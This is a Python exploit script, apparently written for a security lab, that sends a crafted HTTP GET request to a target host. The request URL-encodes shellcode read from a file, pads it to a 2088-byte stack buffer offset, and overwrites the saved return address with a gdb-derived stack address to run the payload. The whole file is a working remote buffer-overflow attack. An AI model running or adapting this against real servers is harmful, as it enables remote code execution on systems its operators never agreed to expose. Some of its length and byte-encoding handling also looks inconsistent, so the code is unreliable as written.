#!/usr/bin/python
import sys
import socket
import traceback
import urllib.parse
import struct

# New addresses based on gdb
stack_saved_ebp = 0x7fffffffdc80  # This is typically EBP
stack_old_retaddr = 0x7fffffffdc88  # This is where we overwrite return address

buffer_offset = 2088  # Updated based on gdb calculations
stack_buffer = 0x7fffffffd460  # pn[] buffer location from gdb
stack_buffer_binary = stack_buffer + 1  # Avoid null bytes

def repeat_to_length(string_to_expand, length):
    return (string_to_expand * (int(length/len(string_to_expand))+1))[:length]

def build_exploit(shellcode):
    # Convert shellcode to a format safe for HTTP transmission
    shellcode_encoded = urllib.parse.quote(shellcode)

    shellcode_len = len(shellcode)
    fill_len = buffer_offset - shellcode_len  # Adjust buffer length correctly

    # Build HTTP request payload
    req = "GET /" + shellcode_encoded + repeat_to_length("A", fill_len)
    req += struct.pack("<Q", stack_buffer_binary).decode('latin1')  # Overwrite return address
    req += " HTTP/1.0\r\n\r\n"

    return req

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req.encode())

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp += rbuf.decode(errors="ignore")  # Avoid crashes due to binary content
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    with open("shellcode.bin", "rb") as shellfile:
        shellcode = shellfile.read()

    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except Exception as e:
    print("Exception:")
    print(traceback.format_exc())
